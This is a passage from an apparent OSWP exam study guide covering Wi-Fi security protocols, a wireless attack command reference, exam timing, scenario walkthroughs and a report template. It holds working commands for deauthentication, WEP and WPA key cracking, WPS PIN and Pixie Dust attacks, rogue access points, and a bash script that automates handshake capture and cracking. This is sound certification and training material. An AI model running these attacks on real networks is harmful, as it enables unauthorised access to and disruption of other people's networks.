- Use HTTPS for protection

#### WEP (Wired Equivalent Privacy)
- RC4 encryption with static keys
- Fundamental flaws in implementation
- Easily cracked (deprecated)

#### WPA (Wi-Fi Protected Access)
- TKIP encryption
- Dynamic key generation
- Improved over WEP but still vulnerable

#### WPA2 (802.11i)
- AES-CCMP encryption
- Strong security when properly implemented
- Current widespread standard

#### WPA3 (2018+)
- Enhanced security features
- SAE (Simultaneous Authentication of Equals)
- Forward secrecy
- Protection against offline attacks

### Authentication Methods

#### Personal/PSK (Pre-Shared Key)
- Single passphrase for all users
- Suitable for home/small office
- 4-way handshake for session keys

#### Enterprise (802.1X)
- Individual user credentials
- RADIUS authentication server
- EAP methods: PEAP, EAP-TLS, EAP-TTLS

#### Open/Captive Portal
- Initial open connection
- Web-based authentication
- Common in public spaces

---

## Complete Command Reference {#command-reference}

### Quick Reference Card

#### Interface Management
```bash
# Monitor mode
airmon-ng start wlan0
airmon-ng stop wlan0mon

# Manual monitor
ip link set wlan0 down
iw dev wlan0 set type monitor  
ip link set wlan0 up

# Channel setting
iwconfig wlan0 channel 6
iw dev wlan0 set channel 6
```

#### Network Discovery
```bash
# Basic scanning
airodump-ng wlan0mon
wash -i wlan0mon
iwlist wlan0 scan

# Targeted monitoring
airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
```

#### Attack Commands

**WEP Attacks:**
```bash
# Fake authentication
aireplay-ng -1 0 -a AP_MAC -h YOUR_MAC wlan0mon

# ARP replay
aireplay-ng --arpreplay -b AP_MAC -h YOUR_MAC wlan0mon

# Crack WEP
aircrack-ng capture.cap
```

**WPA Attacks:**
```bash
# Deauth attack
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon

# Crack WPA
aircrack-ng -w wordlist.txt capture.cap
```

**WPS Attacks:**
```bash
# Scan WPS
wash -i wlan0mon

# PIN attack
reaver -i wlan0mon -b AP_MAC -vv

# Pixie dust
reaver -i wlan0mon -b AP_MAC -vv -K 1
```

#### Network Connections
```bash
# WPA connection
wpa_passphrase "SSID" "password" > config.conf
wpa_supplicant -i wlan0 -c config.conf -B
dhclient wlan0

# Open network
iwconfig wlan0 essid "OpenNet"
dhclient wlan0
```

### Advanced Command Combinations

#### Automated Attack Scripts
```bash
#!/bin/bash
# WPA attack automation example
TARGET_MAC="AA:BB:CC:DD:EE:FF"
CHANNEL="6"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Start monitoring
airodump-ng --bssid $TARGET_MAC -c $CHANNEL -w attack wlan0mon &
DUMP_PID=$!

# Wait for handshake capture
sleep 60

# Deauth attack
aireplay-ng -0 5 -a $TARGET_MAC wlan1mon

# Stop monitoring
kill $DUMP_PID

# Crack password
aircrack-ng -w $WORDLIST attack.cap
```

#### Multi-Interface Operations
```bash
# Interface 1: Monitoring
airodump-ng --bssid TARGET -c 6 -w capture wlan0mon &

# Interface 2: Attacking  
aireplay-ng -0 0 -a TARGET wlan1mon &

# Interface 3: Rogue AP
hostapd rogue_ap.conf
```

---

## Exam Preparation Strategy {#exam-strategy}

### Pre-Exam Checklist

#### Technical Preparation
- [ ] Master all aircrack-ng suite tools
- [ ] Practice WEP attacks (connected client and clientless scenarios)
- [ ] Practice WPA/WPA2 handshake capture and cracking
- [ ] Understand WPS attack methodology
- [ ] Practice rogue AP creation with hostapd-mana
- [ ] Learn manual network connections (wpa_supplicant)
- [ ] Practice with bettercap and kismet
- [ ] Understand captive portal bypass techniques

#### Environment Setup
- [ ] Verify Kali Linux tools installation
- [ ] Test wireless adapter compatibility
- [ ] Practice VPN connection setup  
- [ ] Prepare note-taking system
- [ ] Test screenshot capabilities

#### Report Writing Preparation
- [ ] Study official report templates
- [ ] Practice technical writing
- [ ] Prepare screenshot organization system
- [ ] Create report structure template

### Time Management Strategy

#### Exam Time Allocation (3h 45m total)
- **Network 1 (Mandatory)**: 90 minutes maximum
- **Network 2**: 75 minutes maximum  
- **Network 3**: 60 minutes maximum
- **Buffer/Review**: 40 minutes

#### Per-Network Approach (45-90 min each)
1. **Reconnaissance (10-15 min)**
   - Identify encryption type
   - Find connected clients
   - Analyze signal strength
   - Choose attack vector

2. **Attack Execution (20-45 min)**
   - Execute primary attack
   - Capture required data
   - Adjust if needed

3. **Key Recovery (10-15 min)**
   - Crack captured data
   - Verify key correctness

4. **Connection/Proof (5-10 min)**  
   - Connect to network
   - Obtain proof.txt
   - Take screenshots

### Common Attack Scenarios

#### Scenario 1: WEP Network
**Expected Approach:**
1. Start packet capture: `airodump-ng --bssid TARGET -c CHANNEL -w wep_attack wlan0mon`
2. Fake authentication: `aireplay-ng -1 0 -a TARGET -h YOUR_MAC wlan0mon`
3. Generate traffic: `aireplay-ng --arpreplay -b TARGET -h YOUR_MAC wlan0mon`
4. Monitor IV collection (need 20,000+ for 64-bit, 40,000+ for 128-bit)
5. Crack key: `aircrack-ng wep_attack.cap`
6. Connect and get proof

**Time Estimate:** 30-60 minutes

#### Scenario 2: WPA/WPA2 Network  
**Expected Approach:**
1. Start capture: `airodump-ng --bssid TARGET -c CHANNEL -w wpa_attack wlan0mon`
2. Wait for client or force handshake: `aireplay-ng -0 5 -a TARGET -c CLIENT wlan0mon`
3. Verify handshake capture in airodump-ng output
4. Crack handshake: `aircrack-ng -w wordlist.txt wpa_attack.cap`
5. Connect and get proof

**Time Estimate:** 30-75 minutes

#### Scenario 3: WPS Network
**Expected Approach:**
1. Scan for WPS: `wash -i wlan0mon`
2. Attack WPS PIN: `reaver -i wlan0mon -b TARGET -vv`
3. Try Pixie Dust if available: `reaver -i wlan0mon -b TARGET -vv -K 1`
4. Use recovered PSK to connect

**Time Estimate:** 60-120 minutes

### Documentation Requirements

#### Required Screenshots per Scenario
1. **Network identification** (airodump-ng output showing target)
2. **Attack execution** (tool commands and output)
3. **Key recovery success** (cracked password/key displayed)  
4. **Proof access** (browser showing proof.txt contents)

#### Report Structure Template
```markdown
# OSWP Exam Report - OS-XXXXX

## Executive Summary
Brief overview of scenarios completed

## Scenario 1: [Network Name]
### Network Information
- BSSID: AA:BB:CC:DD:EE:FF
- SSID: NetworkName
- Channel: 6
- Encryption: WPA2-PSK

### Attack Methodology
1. Reconnaissance
2. Handshake capture
3. Password cracking
4. Network access

### Evidence
- Screenshot 1: Network identification
- Screenshot 2: Handshake capture
- Screenshot 3: Password cracked
- Screenshot 4: Proof.txt accessed

## Scenario 2: [Continue format]
```

### Final Tips

#### During the Exam
1. **Read instructions carefully** - Note which scenario is mandatory
2. **Start with reconnaissance** - Understand all networks before attacking
3. **Choose efficient attacks** - Don't waste time on unlikely vectors  
4. **Monitor progress** - Switch scenarios if stuck for 30+ minutes
5. **Take screenshots early** - Capture everything, organize later
6. **Verify connectivity** - Always test connection with obtained keys

#### Common Pitfalls to Avoid
1. **Using prohibited tools** (wifite, wifiphisher, etc.)
2. **Poor time management** (spending too long on one network)
3. **Incomplete documentation** (missing required screenshots)
4. **Not testing connections** (key works but can't access proof)
5. **Wrong wordlist selection** (use provided Kali wordlists)

**Remember**: The OSWP exam tests practical wireless attack skills. Focus on methodology, proper tool usage, and clear documentation. Practice the fundamentals repeatedly until they become second nature.

---

## Final Notes

This gamebook covers all essential OSWP topics with practical commands, expected outputs, and step-by-step methodologies. Practice each section thoroughly and adapt the techniques to different network configurations. 

**Success factors:**
- Consistent practice with real hardware
- Understanding underlying protocols
- Efficient time management
- Clear documentation habits
- Staying calm under exam pressure

Good luck with your OSWP certification!

---

*This gamebook is compiled from multiple authoritative sources including official OffSec documentation, community experiences, and technical references in multiple languages. Use responsibly and only on networks you own or have explicit permission to test.*